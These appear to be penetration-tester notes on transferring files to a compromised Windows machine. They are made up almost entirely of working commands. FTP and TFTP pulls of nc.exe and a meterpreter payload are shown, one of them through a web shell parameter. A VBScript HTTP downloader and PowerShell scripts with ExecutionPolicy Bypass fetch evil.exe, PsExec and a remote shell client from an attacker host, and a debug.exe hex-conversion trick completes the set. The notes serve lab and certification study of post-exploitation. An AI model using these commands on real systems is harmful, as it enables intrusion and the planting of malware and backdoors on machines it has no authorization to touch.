### Upload /Download file - Transfer Tricks and reminders

https://blog.netspi.com/15-ways-to-download-a-file/

Reminder to check out the red team field manual tips and tricks  “File Transfer”

#### Transferring methods and tools

debug.exe to transfer files

Upload files using scripting languages

o	USE VBScript

o	USE POWERSHELL

o	USE PYTHON

o	Use POWERSHELL

Using other programs to transfer files

o	USE WGET

o	USE FETCH

o	Using TFTP

o	USE FTP

#### FTP TRANSFERRING

ftp ftp.microsoft.com

use get or put

#### UPLOADING FILES WITH FTP

If you get access on the target and FTP is installed as a service then you might be able to setup FTP on the local attack 

station and get files to the target. 

apt-get update && apt-get install pure-ftpd

we first need to create a new user for PureFTPd.

groupadd ftpgroup

useradd -g ftpgroup -d /dev/null -s /etc ftpuser

pure-pw useradd offsec -u ftpuser -d /ftphome

pure-pw mkdb

cd /etc/pure-ftpd/auth/

ln -s ../conf/PureDB 60pdb

mkdir -p /ftphome

chown -R ftpuser:ftpgroup /ftphome/

/etc/init.d/pure-ftpd restart

We then run the script and provide a password for the offsec when prompted:

root@kali:~# chmod 755 setup-ftp

root@kali:~# ./setup-ftp

Password:

Enter it again:

Restarting ftp server

With our FTP server configured, we can now paste the following commands into a remote Windows shell and download files over FTP 

non-interactively.

From target machine run commands below

C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt

C:\Users\offsec>echo USER offsec>> ftp.txt

C:\Users\offsec>echo ftp>> ftp.txt

C:\Users\offsec>echo bin >> ftp.txt

C:\Users\offsec>echo GET nc.exe >> ftp.txt

C:\Users\offsec>echo bye >> ftp.txt

C:\Users\offsec>ftp -v -n -s:ftp.txt

#### UPLOADING FILES WITH TFTP

We first need to set up the TFTP server in Kali.

mkdir /tftp

1.	atftpd --daemon --port 69 /tftp

2.	cp /usr/share/windows-binaries/nc.exe /tftp/

3.	tftp -i 10.11.0.5 get nc.exe

another method we first need to set up the TFTP server in Kali.

1.	atftpd -daemon -bind-address 192.168.20.09 /tmp

2.	set the command parameter in shell.php script as follows

http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php c:\\xampp\\htdocs\\meterpreter.php

#### UPLOADING FILE USING VBSCRIPT

write out a VBS script that acts as a simple HTTP downloader

echo strUrl = WScript.Arguments.Item(0) > wget.vbs

echo StrFile = WScript.Arguments.Item(1) >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs

echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs

echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs

echo Err.Clear >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs

echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs

echo http.Open "GET", strURL, False >> wget.vbs

echo http.Send >> wget.vbs

echo varByteArray = http.ResponseBody >> wget.vbs

echo Set http = Nothing >> wget.vbs

echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs

echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs

echo strData = "" >> wget.vbs

echo strBuffer = "" >> wget.vbs

echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs

echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs

echo Next >> wget.vbs

echo ts.Close >> wget.vbs

Now, we can serve files on our own web server, and download them to the victim

machine with ease:

C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe

#### UPLOADING FILE USING POWERSHELL

C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1

C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1

C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1

C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1

C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1

Now, we can use PowerShell to run the script and download our file:

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

#### POWERSHELL TRANSFER PSEXEC

•	You will have to uplaod PsExec

•	echo $storageDir = $pwd > psewget.ps1

•	echo $webclient = New-Object System.Net.WebClient >>psewget.ps1

•	echo $url = "http://10.11.0.69/PsExec.exe" >>psewget.ps1

•	echo $file = "PsExec.exe" >>psewget.ps1

•	echo $webclient.DownloadFile($url,$file) >>psewget.ps1

•	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File psewget.ps1

#### POWERSHELL TRANSFER VIPER-SHELL

•	echo $storageDir = $pwd > viperwget.ps1

•	echo $webclient = New-Object System.Net.WebClient >>viperwget.ps1

•	echo $url = "http://10.11.0.202/ViperClient.exe" >>viperwget.ps1

•	echo $file = "ViperClient.exe" >>viperwget.ps1

•	echo $webclient.DownloadFile($url,$file) >>viperwget.ps1


•	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File viperwget.ps1

#### USING DEBUG.EXE TO TRANSFER FILES

There is a 64k byte size limit to the files that can be created by debug.exe

root@kali:~# locate nc.exe|grep binaries

/usr/share/windows-binaries/nc.exe

root@kali:~# cp /usr/share/windows-binaries/nc.exe .

root@kali:~# ls -l nc.exe

-rwxr-xr-x 1 root root 59392 Apr 11 05:13 nc.exe

root@kali:~# upx -9 nc.exe

root@kali:~# ls -l nc.exe

-rwxr-xr-x 1 root root 29184 Apr 11 05:13 nc.exe

root@kali:~# locate exe2bat

/usr/share/windows-binaries/exe2bat.exe

root@kali:~# cp /usr/share/windows-binaries/exe2bat.exe .

root@kali:~# wine exe2bat.exe nc.exe nc.txt

Finished: nc.exe > nc.txt

root@kali:~# head nc.txt

Now copy and paste the hex code into the c:\ on the target machine

